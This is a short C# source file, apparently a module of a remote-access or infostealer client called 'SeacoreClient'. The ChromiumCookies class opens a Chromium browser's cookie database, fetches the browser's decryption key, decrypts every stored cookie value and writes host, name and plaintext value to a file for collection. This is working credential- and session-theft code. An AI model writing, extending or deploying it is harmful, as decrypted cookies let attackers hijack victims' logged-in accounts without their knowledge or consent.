namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static class ChromiumCookies
    {
        public static void Recover(string browserName, string relativeSearchPath)
        {
            relativeSearchPath = Path.Combine(relativeSearchPath, "Network");
            string dbName = "Cookies";
            string query = ChromiumCommon.DbQueries["Cookies"];
            byte[] key = ChromiumCommon.GetKey(browserName);
            if (key == null) return;

            ChromiumCommon.ExecuteSqliteQueryAndProcessResults(
                browserName,
                dbName,
                query,
                reader =>
                {
                    string host = reader["host_key"].ToString();
                    string name = reader["name"].ToString();
                    byte[] encryptedValue = (byte[])reader["encrypted_value"];
                    string decryptedValue = ChromiumCommon.DecryptChromium(encryptedValue, key);
                    return $"Host: {host}\nName: {name}\nValue: {decryptedValue}\n";
                },
                ChromiumCommon.FileNames["Cookies"]);
        }
    }
}
